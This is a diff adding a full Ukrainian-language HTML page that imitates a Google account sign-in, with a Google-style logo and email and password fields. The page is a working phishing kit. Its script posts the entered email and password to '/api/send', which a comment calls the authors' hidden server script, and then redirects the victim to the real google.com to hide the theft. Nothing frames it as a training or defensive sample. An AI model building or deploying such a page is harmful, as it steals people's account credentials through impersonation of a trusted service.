@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Вхід в акаунт Google</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Google Sans', Roboto, Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
+        body { background-color: #ffffff; display: flex; justify-content: center; align-items: flex-start; min-height: 100vh; color: #202124; }
+        .container { width: 100%; max-width: 360px; padding: 24px; display: flex; flex-direction: column; min-height: 100vh; position: relative; }
+        .header { text-align: center; margin-top: 32px; margin-bottom: 32px; }
+        .logo { height: 24px; margin-bottom: 16px; }
+        .title { font-size: 24px; font-weight: 400; line-height: 32px; color: #1f1f1f; margin-bottom: 8px; }
+        .subtitle { font-size: 16px; font-weight: 400; line-height: 24px; color: #444746; }
+        .form-group { position: relative; margin-bottom: 28px; width: 100%; }
+        .form-control { width: 100%; padding: 16px; font-size: 16px; border: 1px solid #747775; border-radius: 4px; outline: none; background: transparent; color: #1f1f1f; transition: border-color 0.2s; }
+        .form-control:focus { border: 2px solid #0b57d0; padding: 15px; }
+        .form-label { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); background: #ffffff; padding: 0 4px; color: #444746; font-size: 16px; pointer-events: none; transition: 0.15s cubic-bezier(0.4, 0, 0.2, 1); }
+        .form-control:focus ~ .form-label, .form-control:not(:placeholder-shown) ~ .form-label { top: 0; font-size: 12px; }
+        .form-control:focus ~ .form-label { color: #0b57d0; }
+        .footer { margin-top: auto; display: flex; justify-content: flex-end; padding-bottom: 16px; width: 100%; }
+        .btn-next { background-color: #0b57d0; color: #ffffff; border: none; padding: 0 24px; height: 40px; border-radius: 100px; font-size: 14px; font-weight: 500; cursor: pointer; display: flex; align-items: center; justify-content: center; }
+        .btn-next:hover { background-color: #0842a0; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <svg class="logo" viewBox="0 0 74 24" width="74" height="24" xmlns="http://w3.org">
+                <path d="M10.24 19.72c-4.94 0-8.98-3.92-8.98-8.8s4.04-8.8 8.98-8.8c2.7 0 4.62 1.06 6.08 2.44l-2.14 2.14c-1.04-1-2.46-1.62-3.94-1.62-3.56 0-6.4 2.86-6.4 6.42s2.84 6.42 6.4 6.42c2.4 0 3.74-.96 4.62-1.84.74-.74 1.18-1.8 1.32-3.22h-5.94v-2.84h8.78c.08.46.14.98.14 1.56 0 1.86-.5 4.34-2.14 5.98-1.6 1.68-3.64 2.54-6.72 2.54z" fill="#4285F4"/>
+                <path d="M39.84 19.72c-3.14 0-5.7-2.42-5.7-5.54s2.56-5.54 5.7-5.54 5.7 2.42 5.7 5.54-2.56 5.54-5.7 5.54z" fill="#EA4335"/>
+                <path d="M26.72 19.72c-3.14 0-5.7-2.42-5.7-5.54s2.56-5.54 5.7-5.54 5.7 2.42 5.7 5.54-2.56 5.54-5.7 5.54z" fill="#FBBC05"/>
+                <path d="M52.14 19.72c-3.02 0-5.18-1.62-5.18-4.52v-8.2h2.62v8c0 1.54 1.04 2.14 2.06 2.14 1.54 0 2.52-1.28 2.52-2.58v-7.56h2.62v12.16h-2.5v-1.2c-.6.82-1.6 1.76-2.14 1.76z" fill="#34A853"/>
+                <path d="M64.4 19.72c-3.12 0-5.4-2.42-5.4-5.54s2.38-5.54 5.4-5.54c1.44 0 2.56.66 3.16 1.36l-2.1 2.1c-.36-.42-.92-.8-1.48-.8-1.12 0-2.14.98-2.14 2.88s1.02 2.88 2.14 2.88c.7 0 1.22-.34 1.62-.76.44-.44.7-1.08.76-2.02h-2.38v-2.5h5.02c.04.24.06.52.06.84 0 1.54-.42 3.52-1.8 4.9-1.34 1.36-3.06 2.08-5.46 2.08z" fill="#4285F4"/>
+                <path d="M72.2 19.72v-11.6h2.62v11.6h-2.62z" fill="#34A853"/>
+            </svg>
+            <h1 class="title">Ввійдіть в акаунт</h1>
+            <p class="subtitle">Введіть свої дані</p>
+        </div>
+
+        <form id="loginForm">
+            <div class="form-group">
+                <input type="email" id="email" class="form-control" placeholder=" " required>
+                <label for="email" class="form-label">Введіть електронну пошту</label>
+            </div>
+            <div class="form-group">
+                <input type="password" id="password" class="form-control" placeholder=" " autofocus required>
+                <label for="password" class="form-label">Пароль</label>
+            </div>
+            <div class="footer">
+                <button type="submit" class="btn-next">Далі</button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // Надсилаємо дані на наш прихований серверний скрипт
+            fetch('/api/send', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email: email, password: password })
+            })
+            .then(res => {
+                // Після успішної відправки перенаправляємо на справжній Google
+                window.location.href = 'https://google.com';
+            })
+            .catch(err => {
+                window.location.href = 'https://google.com';
+            });
+        });
+    </script>
+</body>
+</html>
